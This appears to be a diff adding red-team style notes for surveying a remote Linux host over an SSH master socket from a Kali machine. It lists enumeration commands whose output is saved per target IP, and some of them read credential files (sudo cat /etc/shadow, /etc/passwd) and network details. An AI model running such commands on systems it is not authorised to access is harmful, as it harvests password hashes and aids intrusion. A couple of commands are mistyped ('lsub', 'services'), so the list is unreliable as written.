@@ -2,3 +2,29 @@ create two survey lists that utilize master socket
 run in kaliops in directory
 
 ssh -S /tmp/T# AUTH "survey command" >> Survey_<ip>
+
+LINUX SURVEY COMMANDS
+______________________
+ssh -S /tmp/T# AUTH "mount" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "lsmod" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "uname -a" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "ls -latr /etc/*release*" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "cat /etc/*release*" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "cat /proc/cpuinfo" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "services --status-all || systemctl status --no-pager" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "cat /proc/meminfo" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "sudo cat /etc/shadow" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "sudo cat /etc/passwd" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "lspci -vv" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "arp -a" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "lsub" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "lsblk" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "sudo fdisk -l" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "free -m" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "sudo dmidecode -t bios" >> Survey_<ip>
+ssh -S /tmp/T# AUTH "cat /etc/hosts" >> Survey_<ip>
+
+
+
+
+
